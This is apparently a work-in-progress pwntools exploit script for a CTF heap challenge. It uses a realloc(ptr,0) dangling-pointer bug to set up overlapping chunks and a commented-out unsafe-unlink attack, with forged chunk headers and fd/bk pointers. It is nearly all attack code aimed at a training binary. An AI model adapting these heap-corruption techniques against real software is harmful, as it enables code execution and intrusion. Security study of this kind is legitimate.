# -*- coding: utf-8 -*- 
from pwn import *
from time import sleep
context.arch = 'amd64'

#可發現到 realloc(ptr,0) 會被當成 free(ptr)
#r = remote('csie.ctf.tw',10138)
r = remote('localhost',8888)

#r.interactive()
size = '64'
content = 'faceb00c'
magic = 0x400c23
def add_profile(name,age,len_desc,desc):
    r.recvuntil(':')
    r.send('1')
    r.recvuntil(':')
    r.send(name.ljust(16,'\0'))
    r.recvuntil(':')
    r.send(str(age))
    r.recvuntil(':')
    r.send(str(len_desc))
    r.recvuntil(':')
    r.send(desc)

def show_profile(idx):
    r.recvuntil(':')
    r.send('2')
    r.recvuntil(':')
    r.send(str(idx))
def edit_profile(idx,name,age,desc):
    r.recvuntil(':')
    r.send('3')
    r.recvuntil(':')
    r.send(str(idx))
    r.recvuntil(':')
    r.send(name)
    r.recvuntil(':')
    r.send(str(age))
    r.recvuntil(':')
    r.send(desc)
def realloc_errorr(idx):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.send(str(idx))
    r.recvuntil(':')
    r.send('\x00')

def del_profile(idx):
    r.recvuntil(':')
    r.send('4')
    r.recvuntil(':')
    r.send(str(idx))

#start produce dangling pointer
add_profile('A',9,0x150,'AAAA')  #0,0x160 + 0x10 = 0xb0 + 0xc0
add_profile('B',9,0xa0,'BBBB')  #1
del_profile(0)  #A
realloc_errorr(1) #B
add_profile('C',9,0xa0,'CCCC')  #0
del_profile(1)  #B
add_profile('D',9,0xb8,'D'*(0xb0-0x8) + chr(0x21) + 'D'*7)  #1 ,the fake C.name chunk header will be set later.
realloc_errorr(1)
add_profile('E',9,0xa0,'E'*8 + chr(0xa1))  #2,be ware of in-use flag of D,and next chunk size check

#fake E.desc chunk header,need 2 query for bypass strlen() 

size = 0xb0
'''
edit_profile(0,'x'*8 +chr(size),'123','size')       #fake chunk in-use flag

prev_size = 0xb0
#edit_profile(1,'edit pre size','123','prev size')    #fake pre size,by edit D.desc
#D.desc sub fake chunk
prev_size = 0x0     #no value because prev chunk ,C.dsec,is in-used.
size = 0xb1         #c0 -> b1
C = 0x602128        #p[1] = 0x602128
fd = C - 0x18
bk = C - 0x10
fake_header = flat( [prev_size,size,fd,bk] ) 
edit_profile(1,'name','123',fake_header)
'''
#unlink
#del_profile(2)      #E
'''

add_profile('A'*16,2,0xc0,'A'*(0xc0-1) ) #1
add_profile('B'*16,2,0xa0,'B'*(0xa0-1) ) #2
del_profile(0)
realloc_errorr(1)
add_profile('C'*16,2,0xb0,'C'*(32) ) #0 desc 可以控制c.name
del_profile(1)
add_profile('D'*16,2,0xa0,'D'*(0xa0-1) ) #1 c.name 指向裡面的資料
#
#edit_profile(1,'DDD',999,'D'*24)


#realloc_errorr(1)
#edit_profile(0,'CCCC',999,'CCCC')
#del_profile(1)
#del_profile(0)
#add_profile('C'*16,18,0xb0,'C'*(0xb0-1) ) #0
#
#realloc_errorr(0)
#add_profile('B'*8,18,0xa0,'B'*(0xa0-1) ) #0
#del_profile(0)
#add_profile('C'*8,18,0xa0,'C'*(0xa0-1) ) #0

#add_profile('kkkk',22,0xa0,'A'*(0xa0-1) ) #0
'''

r.interactive()

